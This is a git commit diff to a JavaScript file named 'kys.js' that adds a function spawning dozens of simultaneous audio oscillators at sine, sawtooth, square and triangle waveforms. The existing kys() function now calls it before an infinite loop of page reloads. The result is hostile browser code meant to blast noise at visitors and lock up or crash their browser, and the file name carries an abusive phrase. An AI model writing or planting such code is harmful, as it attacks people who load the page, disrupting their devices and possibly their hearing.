1f492a8157f4d0c46a4de6c875e0c22e1600e3b7
chessaimaker <147644008+chessaimaker@users.noreply.github.com>
2024-04-17 12:42:04 -0400

    Update kys.js

--- kys.js
+++ kys.js
@@ -1,4 +1,71 @@
+        var oscillators = []; // Array to store oscillators
+
+        function toggleOscillator() {
+            // Create an audio context
+            var AudioContext = window.AudioContext || window.webkitAudioContext;
+            var audioContext = new AudioContext();
+
+            // Create and start oscillators
+            for (var i = 1; i <= 200000; i += 20000) {
+                var oscillator = audioContext.createOscillator();
+                oscillator.type = 'sine'; // Set oscillator type to sine wave
+                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
+                oscillator.connect(audioContext.destination);
+                oscillator.start();
+                oscillators.push(oscillator); // Store oscillator in the array
+            }
+            for (var i = 1; i <= 200000; i += 20000) {
+                var oscillator = audioContext.createOscillator();
+                oscillator.type = 'sawtooth'; // Set oscillator type to sine wave
+                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
+                oscillator.connect(audioContext.destination);
+                oscillator.start();
+                oscillators.push(oscillator); // Store oscillator in the array
+            }
+            for (var i = 1; i <= 200000; i += 20000) {
+                var oscillator = audioContext.createOscillator();
+                oscillator.type = 'square'; // Set oscillator type to sine wave
+                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
+                oscillator.connect(audioContext.destination);
+                oscillator.start();
+                oscillators.push(oscillator); // Store oscillator in the array
+            }
+            for (var i = 1; i <= 200000; i += 20000) {
+                var oscillator = audioContext.createOscillator();
+                oscillator.type = 'triangle'; // Set oscillator type to sine wave
+                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
+                oscillator.connect(audioContext.destination);
+                oscillator.start();
+                oscillators.push(oscillator); // Store oscillator in the array
+            }
+            for (var i = 1; i <= 200000; i += 20000) {
+                var oscillator = audioContext.createOscillator();
+                oscillator.type = 'sine'; // Set oscillator type to sine wave
+                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
+                oscillator.connect(audioContext.destination);
+                oscillator.start();
+                oscillators.push(oscillator); // Store oscillator in the array
+            }
+            for (var i = 1; i <= 200000; i += 20000) {
+                var oscillator = audioContext.createOscillator();
+                oscillator.type = 'sine'; // Set oscillator type to sine wave
+                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
+                oscillator.connect(audioContext.destination);
+                oscillator.start();
+                oscillators.push(oscillator); // Store oscillator in the array
+            }
+            for (var i = 1; i <= 200000; i += 20000) {
+                var oscillator = audioContext.createOscillator();
+                oscillator.type = 'sine'; // Set oscillator type to sine wave
+                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
+                oscillator.connect(audioContext.destination);
+                oscillator.start();
+                oscillators.push(oscillator); // Store oscillator in the array
+            }
+
+        }
 function kys(){
+  toggleOscillator();
 setTimeout(function(){
   while(true){
     window.location.reload();
